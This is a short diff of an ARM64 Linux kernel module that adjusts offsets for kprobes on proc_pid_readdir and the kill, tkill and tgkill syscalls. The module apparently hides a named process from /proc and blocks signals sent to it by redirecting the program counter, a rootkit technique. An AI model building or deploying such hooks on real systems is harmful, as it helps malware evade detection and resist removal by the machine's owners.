@@ -76,7 +76,7 @@ static int __arm64_sys_kill_pre_handler(struct kprobe *p,
   pid_t target_pid = find_pid_by_name(PROCESS_NAME);
 
   if (regs->regs[19] == target_pid) {
-    regs->pc = (unsigned long)p->addr + 0x15C;
+    regs->pc = (unsigned long)p->addr + 0x1a4;
     return 1;
   }
 
@@ -84,7 +84,7 @@ static int __arm64_sys_kill_pre_handler(struct kprobe *p,
 }
 
 static struct kprobe kp1 = {.symbol_name = "proc_pid_readdir",
-                            .offset = 0x134,
+                            .offset = 0x124,
                             .pre_handler = proc_pid_readdir_pre_handler};
 
 static struct kprobe kp2 = {.symbol_name = "__arm64_sys_tgkill",
@@ -96,7 +96,7 @@ static struct kprobe kp3 = {.symbol_name = "__arm64_sys_tkill",
                             .pre_handler = __arm64_sys_tkill_pre_handler};
 
 static struct kprobe kp4 = {.symbol_name = "__arm64_sys_kill",
-                            .offset = 0x54,
+                            .offset = 0x44,
                             .pre_handler = __arm64_sys_kill_pre_handler};
 
 static struct kprobe *kprobe_handlers[] = {
